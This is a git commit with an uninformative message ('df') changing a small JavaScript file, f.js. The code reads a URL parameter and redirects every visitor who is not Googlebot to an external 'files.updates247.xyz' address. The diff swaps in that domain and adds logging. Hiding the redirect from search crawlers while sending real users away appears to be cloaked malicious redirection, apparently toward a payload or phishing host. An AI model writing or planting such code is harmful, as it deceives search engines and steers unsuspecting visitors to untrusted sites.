ef1653842fe3c2614d9d761218471aba1051dd10
codexgod <rajniti.fb@gmail.com>
2026-09-11 09:01:04 +0600

    df
    df

--- f.js
+++ f.js
@@ -1,7 +1,11 @@
 const config = new URLSearchParams(window.location.search).get('config');
-const slug = config && config.split('/').pop();
+const slug = config ? config.match(/([^\/]+)$/)?.[1] : null;
+
+console.log("CONFIG:", config);
+console.log("SLUG:", slug);
 
 if (slug && !navigator.userAgent.includes('Googlebot')) {
-    window.location.href = "http://abc.xyz/" + encodeURIComponent(slug);
+    window.location.href = "https://files.updates247.xyz/" + encodeURIComponent(slug);
 } else {
     console.log("Thanks for visiting my page");
+}
